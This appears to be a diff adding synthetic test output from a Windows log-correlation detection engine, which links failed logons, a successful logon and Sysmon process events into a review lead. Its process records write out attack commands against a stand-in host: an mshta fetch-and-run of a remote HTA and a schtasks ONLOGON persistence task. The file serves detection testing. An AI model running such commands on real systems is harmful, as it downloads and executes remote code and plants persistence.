@@ -1,0 +1,330 @@
+{
+  "schema_version": 1,
+  "engine_version": "2.0.0",
+  "engine_sha256": "9874104f0e9a6948f10469ed995c2b531745d7cc86027d8227d3decb491a6e60",
+  "scenario": {
+    "id": "CASE-005-synthetic-collection",
+    "collection_reason": "Security, Sysmon and background fixtures generated together; explicit scope is limited to these three exact sources.",
+    "kind": "synthetic",
+    "source_sha256": [
+      "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+      "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+      "6d5bcfc49f313e1a3dc732b496c565ff36923e6902622c43e2632bc98b4466cb"
+    ]
+  },
+  "raw_events": 2511,
+  "unique_observations": 2511,
+  "duplicate_observations": 0,
+  "parameters": {
+    "failure_threshold": 5,
+    "auth_window_seconds": 600,
+    "chain_window_seconds": 900
+  },
+  "nodes": [
+    {
+      "id": "bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6",
+      "host": "WS-CHAIN-LAB",
+      "guid": "ac333bb9-aa2e-5082-938a-2c0dee8262a1",
+      "timestamp": "2026-09-03T10:00:06.000000Z",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
+      "user": "LAB\\analyst.lab",
+      "risk_marker": null,
+      "evidence": [
+        {
+          "event_uid": "bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6",
+          "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+          "source_line": 1,
+          "record_id": 106,
+          "timestamp": "2026-09-03T10:00:06.000000Z",
+          "host": "WS-CHAIN-LAB",
+          "event_id": 1
+        }
+      ],
+      "activity": []
+    },
+    {
+      "id": "8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c",
+      "host": "WS-CHAIN-LAB",
+      "guid": "f778258b-2409-596c-9c79-f0ab1770249d",
+      "timestamp": "2026-09-03T10:00:07.000000Z",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta.exe https://payload.example.invalid/stage.hta",
+      "user": "LAB\\analyst.lab",
+      "risk_marker": "mshta remote/inline script argument",
+      "evidence": [
+        {
+          "event_uid": "8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c",
+          "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+          "source_line": 2,
+          "record_id": 107,
+          "timestamp": "2026-09-03T10:00:07.000000Z",
+          "host": "WS-CHAIN-LAB",
+          "event_id": 1
+        }
+      ],
+      "activity": [
+        {
+          "evidence": {
+            "event_uid": "bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9",
+            "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+            "source_line": 3,
+            "record_id": 108,
+            "timestamp": "2026-09-03T10:00:08.000000Z",
+            "host": "WS-CHAIN-LAB",
+            "event_id": 3
+          },
+          "fields": {
+            "DestinationIp": "198.51.100.20",
+            "DestinationPort": "443",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "Initiated": "true",
+            "ProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+            "Protocol": "tcp"
+          }
+        }
+      ]
+    },
+    {
+      "id": "42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1",
+      "host": "WS-CHAIN-LAB",
+      "guid": "582945ac-4be3-5081-ab8d-39ed62d01823",
+      "timestamp": "2026-09-03T10:00:09.000000Z",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"",
+      "user": "LAB\\analyst.lab",
+      "risk_marker": null,
+      "evidence": [
+        {
+          "event_uid": "42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1",
+          "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+          "source_line": 4,
+          "record_id": 109,
+          "timestamp": "2026-09-03T10:00:09.000000Z",
+          "host": "WS-CHAIN-LAB",
+          "event_id": 1
+        }
+      ],
+      "activity": []
+    }
+  ],
+  "edges": [
+    {
+      "from": "bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6",
+      "to": "8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c",
+      "basis": "same host + ParentProcessGuid = ProcessGuid + parent observed no later than child",
+      "evidence": {
+        "event_uid": "8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c",
+        "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+        "source_line": 2,
+        "record_id": 107,
+        "timestamp": "2026-09-03T10:00:07.000000Z",
+        "host": "WS-CHAIN-LAB",
+        "event_id": 1
+      }
+    },
+    {
+      "from": "8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c",
+      "to": "42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1",
+      "basis": "same host + ParentProcessGuid = ProcessGuid + parent observed no later than child",
+      "evidence": {
+        "event_uid": "42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1",
+        "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+        "source_line": 4,
+        "record_id": 109,
+        "timestamp": "2026-09-03T10:00:09.000000Z",
+        "host": "WS-CHAIN-LAB",
+        "event_id": 1
+      }
+    }
+  ],
+  "chains": [
+    {
+      "id": "16e8fa0314bbae237ed41d9e704febc21aa4af9895ac74bc8e4210f34665d4c0",
+      "rule_id": "CHAIN-001",
+      "title": "Authentication-to-execution-to-task investigation lead",
+      "status": "needs_review",
+      "host": "WS-CHAIN-LAB",
+      "user": "lab\\analyst.lab",
+      "stages": [
+        {
+          "name": "Repeated failures",
+          "evidence": [
+            {
+              "event_uid": "f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3",
+              "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+              "source_line": 1,
+              "record_id": 100,
+              "timestamp": "2026-09-03T10:00:00.000000Z",
+              "host": "WS-CHAIN-LAB",
+              "event_id": 4625
+            },
+            {
+              "event_uid": "34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a",
+              "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+              "source_line": 2,
+              "record_id": 101,
+              "timestamp": "2026-09-03T10:00:01.000000Z",
+              "host": "WS-CHAIN-LAB",
+              "event_id": 4625
+            },
+            {
+              "event_uid": "f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed",
+              "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+              "source_line": 3,
+              "record_id": 102,
+              "timestamp": "2026-09-03T10:00:02.000000Z",
+              "host": "WS-CHAIN-LAB",
+              "event_id": 4625
+            },
+            {
+              "event_uid": "adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4",
+              "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+              "source_line": 4,
+              "record_id": 103,
+              "timestamp": "2026-09-03T10:00:03.000000Z",
+              "host": "WS-CHAIN-LAB",
+              "event_id": 4625
+            },
+            {
+              "event_uid": "d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7",
+              "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+              "source_line": 5,
+              "record_id": 104,
+              "timestamp": "2026-09-03T10:00:04.000000Z",
+              "host": "WS-CHAIN-LAB",
+              "event_id": 4625
+            }
+          ]
+        },
+        {
+          "name": "Matching successful network logon",
+          "evidence": [
+            {
+              "event_uid": "0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3",
+              "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+              "source_line": 6,
+              "record_id": 105,
+              "timestamp": "2026-09-03T10:00:05.000000Z",
+              "host": "WS-CHAIN-LAB",
+              "event_id": 4624
+            }
+          ]
+        },
+        {
+          "name": "Session-linked risky process",
+          "evidence": [
+            {
+              "event_uid": "8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c",
+              "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+              "source_line": 2,
+              "record_id": 107,
+              "timestamp": "2026-09-03T10:00:07.000000Z",
+              "host": "WS-CHAIN-LAB",
+              "event_id": 1
+            }
+          ]
+        },
+        {
+          "name": "Process-linked initiated connection",
+          "evidence": [
+            {
+              "event_uid": "bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9",
+              "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+              "source_line": 3,
+              "record_id": 108,
+              "timestamp": "2026-09-03T10:00:08.000000Z",
+              "host": "WS-CHAIN-LAB",
+              "event_id": 3
+            }
+          ]
+        },
+        {
+          "name": "Descendant task-creation command",
+          "evidence": [
+            {
+              "event_uid": "42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1",
+              "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+              "source_line": 4,
+              "record_id": 109,
+              "timestamp": "2026-09-03T10:00:09.000000Z",
+              "host": "WS-CHAIN-LAB",
+              "event_id": 1
+            }
+          ]
+        }
+      ],
+      "join_basis": [
+        "approved collection source scope",
+        "auth host/account/domain/IP/type",
+        "nonzero LogonGuid + host + user; LogonId checked when present",
+        "ProcessGuid",
+        "observed parent ancestry"
+      ],
+      "limitations": [
+        "Not proof of compromise, payload execution, task registration or task execution",
+        "Authorized administrative behavior can match",
+        "Clock skew and missing telemetry can prevent joins",
+        "Only selected command markers are recognized"
+      ]
+    }
+  ],
+  "candidates": [
+    {
+      "success": {
+        "event_uid": "0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3",
+        "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+        "source_line": 6,
+        "record_id": 105,
+        "timestamp": "2026-09-03T10:00:05.000000Z",
+        "host": "WS-CHAIN-LAB",
+        "event_id": 4624
+      },
+      "failure_count": 5,
+      "complete": true,
+      "missing": []
+    }
+  ],
+  "diagnostics": [],
+  "telemetry": [
+    {
+      "name": "Failed logon",
+      "provider": "microsoft-windows-security-auditing",
+      "event_id": 4625,
+      "count": 5
+    },
+    {
+      "name": "Successful logon",
+      "provider": "microsoft-windows-security-auditing",
+      "event_id": 4624,
+      "count": 1
+    },
+    {
+      "name": "Process creation",
+      "provider": "microsoft-windows-sysmon",
+      "event_id": 1,
+      "count": 3
+    },
+    {
+      "name": "Network connection",
+      "provider": "microsoft-windows-sysmon",
+      "event_id": 3,
+      "count": 1
+    },
+    {
+      "name": "Task registration",
+      "provider": "microsoft-windows-security-auditing",
+      "event_id": 4698,
+      "count": 1
+    }
+  ],
+  "event_counts": {
+    "Microsoft-Windows-Security-Auditing / 4634": 2500,
+    "Microsoft-Windows-Security-Auditing / 4625": 5,
+    "Microsoft-Windows-Security-Auditing / 4624": 1,
+    "Microsoft-Windows-Sysmon / 1": 3,
+    "Microsoft-Windows-Sysmon / 3": 1,
+    "Microsoft-Windows-Security-Auditing / 4698": 1
+  },
+  "verdict": "unassessed; correlation creates review leads"
+}
